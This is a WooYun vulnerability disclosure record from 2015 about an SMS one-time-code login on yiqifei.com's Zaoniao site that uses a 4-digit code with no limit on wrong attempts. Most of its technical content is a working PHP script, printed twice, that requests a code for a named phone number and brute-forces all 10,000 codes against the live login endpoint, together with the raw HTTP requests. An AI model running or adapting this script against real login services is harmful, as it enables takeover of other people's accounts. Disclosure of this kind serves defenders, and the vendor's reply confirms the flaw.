{"id": 37444, "wybug_id": "wooyun-2015-099675", "wybug_title": "一起飞旗下早鸟网某设计导致可登录任意手机用户（与一起飞官方同库）", "wybug_corp": "yiqifei.com", "wybug_author": "Jim叔叔", "wybug_date": "2015-03-06 14:01", "wybug_open_date": "2015-04-20 14:22", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向公众公开  简要描述： 带我飞~~~ 详细说明：  早鸟网登录地址：http://mzaoniao.wm.yiqifei.com/Account/Login?returnUrl=%2FMember其中的手机动态密码登录，先用自己的手机试了一下，收到的是4位数字验证码， \n\n随便输错误的数字试了几十次，没有限制错误次数，有戏\n\n丢到burp暴力猜解了一下，当验证码正确时，由于burp不能匹配结果包含某字符串时停止，所以会继续尝试错误的验证码，导致不能进到用户界面。\n\n于是手写了一个poc，分分钟登录任意手机账号：\n<?php$tel = '13186983074'; //目标手机号//先发送动态密码到手机curlpost(\"mobile=$tel\",'http://mzaoniao.wm.yiqifei.com/Account/SendSMSCode');//登录url$url = 'http://mzaoniao.wm.yiqifei.com/Account/Login?returnUrl=%2FMember';//暴力猜解4位数字验证码for($i=0;$i<=9999;$i++){\t$code = sprintf(\"%04d\", $i);\t$data = \"Mobile=$tel&Code=$code&Type=2\";\t$result = curlpost($data, $url);\t//如果返回结果不包含\"错误\"，则表示验证码正确，跳转到用户信息页面\tif(FALSE == strpos($result, '错误'))\t{\t\techo '<script>window.location=\"http://mzaoniao.wm.yiqifei.com/Member\"</script>';\t\tbreak;\t}}function curlpost($data,$url) //curlpost 函数{\t$ch = curl_init();//初始化curl  \tcurl_setopt($ch,CURLOPT_URL,$url);//抓取指定网页  \tcurl_setopt($ch, CURLOPT_HEADER, 0);//设置header  \tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//要求结果为字符串且输出到屏幕上  \tcurl_setopt($ch, CURLOPT_POST, 1);//post提交方式  \tcurl_setopt($ch, CURLOPT_POSTFIELDS, $data); //post data\t$result = curl_exec($ch);//运行curl  \tcurl_close($ch);  \treturn $result;}\n\n\n   漏洞证明：  //发送验证码接口POST /Account/SendSMSCode HTTP/1.1Host: mzaoniao.wm.yiqifei.commobile=13186983074//验证接口POST /Account/Login?returnUrl=%2FMember HTTP/1.1Host: mzaoniao.wm.yiqifei.comMobile=13186983074&Code=0735&Type=2\n<?php$tel = '13186983074'; //目标手机号//先发送动态密码到手机curlpost(\"mobile=$tel\",'http://mzaoniao.wm.yiqifei.com/Account/SendSMSCode');//登录url$url = 'http://mzaoniao.wm.yiqifei.com/Account/Login?returnUrl=%2FMember';//暴力猜解4位数字验证码for($i=0;$i<=9999;$i++){\t$code = sprintf(\"%04d\", $i);\t$data = \"Mobile=$tel&Code=$code&Type=2\";\t$result = curlpost($data, $url);\t//如果返回结果不包含\"错误\"，则表示验证码正确，跳转到用户信息页面\tif(FALSE == strpos($result, '错误'))\t{\t\techo '<script>window.location=\"http://mzaoniao.wm.yiqifei.com/Member\"</script>';\t\tbreak;\t}}function curlpost($data,$url) //curlpost 函数{\t$ch = curl_init();//初始化curl  \tcurl_setopt($ch,CURLOPT_URL,$url);//抓取指定网页  \tcurl_setopt($ch, CURLOPT_HEADER, 0);//设置header  \tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//要求结果为字符串且输出到屏幕上  \tcurl_setopt($ch, CURLOPT_POST, 1);//post提交方式  \tcurl_setopt($ch, CURLOPT_POSTFIELDS, $data); //post data\t$result = curl_exec($ch);//运行curl  \tcurl_close($ch);  \treturn $result;}\n\n\n   修复方案：  带我飞~~~   版权声明：转载请注明来源 Jim叔叔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-03-06 14:16 厂商回复： 感谢对一起飞关注，已安排修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}